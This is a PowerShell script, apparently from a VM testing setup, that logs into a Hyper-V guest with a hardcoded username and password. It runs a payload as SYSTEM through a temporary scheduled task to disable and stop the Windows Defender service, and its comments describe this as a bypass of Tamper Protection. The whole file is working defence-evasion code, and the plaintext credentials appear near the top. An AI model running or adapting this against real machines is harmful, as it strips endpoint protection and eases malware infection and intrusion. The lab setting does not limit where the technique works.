# antagonist-defender-kill.ps1 - disable WinDefend service via sc config (SYSTEM
# scheduled task, bypassing Tamper Protection which only protects service STOP
# and MpPreference, not service START TYPE config). Then reboot to take effect.
param(
    [string]$VmId = '7b66415c-52cb-468e-b9bd-368746f42863'
)
$ErrorActionPreference = 'Continue'
function W([string]$m) { Write-Output $m }
"=== defender-kill @ $(Get-Date -Format 'yyyy-MM-dd HH:mm:ss') ==="

$user = 'test'; $pass = 'Kolomina520!'
$cred = New-Object System.Management.Automation.PSCredential("$env:COMPUTERNAME\$user", (ConvertTo-SecureString $pass -AsPlainText -Force))
$deadline = (Get-Date).AddSeconds(120); $s = $null
while ((Get-Date) -lt $deadline) {
    try { $s = New-PSSession -VmId $VmId -Credential $cred -ErrorAction Stop; break } catch {}
    Start-Sleep -Seconds 2
}
if (-not $s) { W "ERROR: connect failed"; exit 1 }
W "PS Direct connected"

# Run as SYSTEM: change WinDefend start type to Disabled
$sysScript = @'
$ErrorActionPreference = 'Continue'
$log = 'C:\Windows\Temp\anxin-defender-kill.log'
"defender-kill @ $(Get-Date -Format 'HH:mm:ss')" | Add-Content $log
$before = sc.exe qc WinDefend 2>&1 | Out-String
"before: $before" | Add-Content $log
$r = sc.exe config WinDefend start= disabled 2>&1 | Out-String
"config result: $r" | Add-Content $log
$after = sc.exe qc WinDefend 2>&1 | Out-String
"after: $after" | Add-Content $log
# also stop it now
$stop = sc.exe stop WinDefend 2>&1 | Out-String
"stop result: $stop" | Add-Content $log
# also disable via policy registry (belt and suspenders)
$path = 'HKLM:\SYSTEM\CurrentControlSet\Services\WinDefend'
Set-ItemProperty -Path $path -Name 'Start' -Value 4 -Type DWord -Force
"reg start=4 set" | Add-Content $log
"done" | Add-Content $log
'@
$sysPath = 'C:\Windows\Temp\anxin-defender-kill.ps1'
Invoke-Command -Session $s -ScriptBlock { param($p,$c) [System.IO.File]::WriteAllText($p,$c,(New-Object System.Text.UTF8Encoding($false))) } -ArgumentList $sysPath, $sysScript

$r = Invoke-Command -Session $s -ScriptBlock {
    param($scriptPath)
    $out = @()
    $action = New-ScheduledTaskAction -Execute 'powershell.exe' -Argument "-NoProfile -ExecutionPolicy Bypass -File `"$scriptPath`""
    $principal = New-ScheduledTaskPrincipal -UserId 'SYSTEM' -LogonType ServiceAccount -RunLevel Highest
    $task = New-ScheduledTask -Action $action -Principal $principal
    Register-ScheduledTask -TaskName 'AnXinKillDefender' -InputObject $task -Force -ErrorAction SilentlyContinue
    Start-ScheduledTask -TaskName 'AnXinKillDefender'
    Start-Sleep -Seconds 15
    Unregister-ScheduledTask -TaskName 'AnXinKillDefender' -Confirm:$false -ErrorAction SilentlyContinue
    if (Test-Path 'C:\Windows\Temp\anxin-defender-kill.log') { $out += Get-Content 'C:\Windows\Temp\anxin-defender-kill.log' }
    $out += "--- current WinDefend state ---"
    $out += (sc.exe query WinDefend 2>&1 | Out-String)
    # also check the service start type
    $start = Get-ItemProperty 'HKLM:\SYSTEM\CurrentControlSet\Services\WinDefend' -Name Start -ErrorAction SilentlyContinue
    $out += "Start reg value=$($start.Start)"
    ,$out
} -ArgumentList $sysPath
$r | ForEach-Object { W "  $_" }

Remove-PSSession $s
W "=== defender-kill done ==="
W "INFO: Reboot VM to fully disable Defender, then re-run retest"